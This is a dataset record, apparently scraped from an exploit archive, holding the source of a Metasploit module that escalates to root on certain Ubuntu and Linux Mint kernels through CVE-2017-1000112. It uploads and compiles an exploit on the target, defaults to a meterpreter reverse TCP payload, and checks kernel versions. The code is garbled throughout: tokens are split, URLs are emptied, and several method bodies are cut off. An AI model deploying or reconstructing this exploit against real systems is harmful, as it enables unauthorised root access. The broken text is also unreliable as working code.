{
    "text": "vul_name : Linux Kernel UDP Fragmentation Offset ( UFO ) Privilege Escalation ， vul_cve : CVE-2017-1000112 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Local ， Rank = GoodRanking ， include Msf : Post : File ， include Msf : Post : Linux : Priv ， include Msf : Post : Linux : System ， include Msf : Post : Linux : Kernel ， include Msf : Exploit : EXE ， include Msf : Exploit : FileDropper ， super ( update_info ( info ,  ， 'Name' => 'Linux Kernel UDP Fragmentation Offset ( UFO ) Privilege Escalation' ,  ， 'Description' => %q{ ， This module attempts to gain root privileges on Linux systems by abusing ， UDP Fragmentation Offload ( UFO ) . ， This exploit targets only systems using Ubuntu ( Trusty / Xenial ) kernels ， 4.4.0-21 <= 4.4.0-89 and 4.8.0-34 <= 4.8.0-58 , including Linux distros ， based on Ubuntu , such as Linux Mint. ， The target system must have unprivileged user namespaces enabled ， and SMAP disabled. ， Bypasses for SMEP and KASLR are included. Failed exploitation ， may crash the kernel. ， This module has been tested successfully on various Ubuntu and Linux ， Mint systems , including :  ， Ubuntu 14.04.5 4.4.0-31-generic x64 Desktop ;  ， Ubuntu 16.04 4.8.0-53-generic ;  ， Linux Mint 17.3 4.4.0-89-generic ;  ， Linux Mint 18 4.8.0-58-generic ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'Andrey Konovalov' ,  # Discovery and C exploit ， 'h00die' ,  # Metasploit module ， 'Brendan Coles' # Metasploit module ，  ]  ,  ， 'DisclosureDate' => 'Aug 10 2017' ,  ， 'Platform' => [ 'linux' ]  ,  ， 'Arch' => [ ARCH_X64 ]  ,  ， 'SessionTypes' => [ 'shell' , 'meterpreter' ]  ,  ， 'Targets' => [ 'Auto' , {} ]  ,  ， 'Privileged' => true ,  ， ' ，  [  ，  [ 'CVE' , '2017-1000112' ]  ,  ，  [ 'EDB' , '43418' ]  ,  ，  [ 'BID' , '100262' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' } ,  ， 'DefaultTarget' => 0 )  ， register_options [  ， OptEnum.new ( 'COMPILE' ,  [ true , 'Compile on target' , 'Auto' , %w [ Auto True False ]  ]  )  ,  ， OptString.new ( 'WritableDir' ,  [ true , 'A directory where we can write files' , '/tmp' ]  )  ，  ]  ， end ， def base_dir ， datastore [ 'WritableDir' ] .to_s ， end ， print_status \"Writing ' # {path}' (  # {data.size} bytes ) .\" ， rm_f path ， write_file path , data ， end ， upload path , data ， cmd_exec \"chmod +x ' # {path}'\" ， end ， upload \" # {path}.c\" , data ， gcc_cmd = \"gcc -o # {path} # {path}.c\" ， gcc_cmd = \"PATH= $ PATH : /usr/bin/ # {gcc_cmd}\" ， end ， output = cmd_exec gcc_cmd ， rm_f \" # {path}.c\" ， unless output.blank? ， print_error output ， fail_with Failure : Unknown , \" # {path}.c failed to compile\" ， end ， cmd_exec \"chmod +x # {path}\" ， end ， path = : File.join Msf : Config.data_directory , 'exploits' , 'cve-2017-1000112' , file ， fd = : File.open path , 'rb' ， data = fd.read fd.stat.size ， fd.close ， data ， end ， def live_compile? ， vprint_good 'gcc is installed' ， end ， unless datastore [ 'COMPILE' ] .eql? 'Auto' ， fail_with Failure : BadConfig , 'gcc is not installed. Compiling will fail.' ， end ， end ， def check ， version = kernel_release ， unless version = ~ /^4\\.4\\.0- ( 21 | 22 | 24 | 28 | 31 | 34 | 36 | 38 | 42 | 45 | 47 | 51 | 53 | 57 | 59 | 62 | 63 | 64 | 66 | 67 | 70 | 71 | 72 | 75 | 78 | 79 | 81 | 83 | 87 | 89 | 81 | 89 ) -generic/ |  ， version = ~ /^4\\.8\\.0- ( 34 | 36 | 39 | 41 | 45 | 46 | 49 | 51 | 52 | 53 | 54 | 56 | 58 ) -generic/ ， vprint_error \"Linux kernel version # {version} is not vulnerable\"",
    "time": "2018.08.03"
}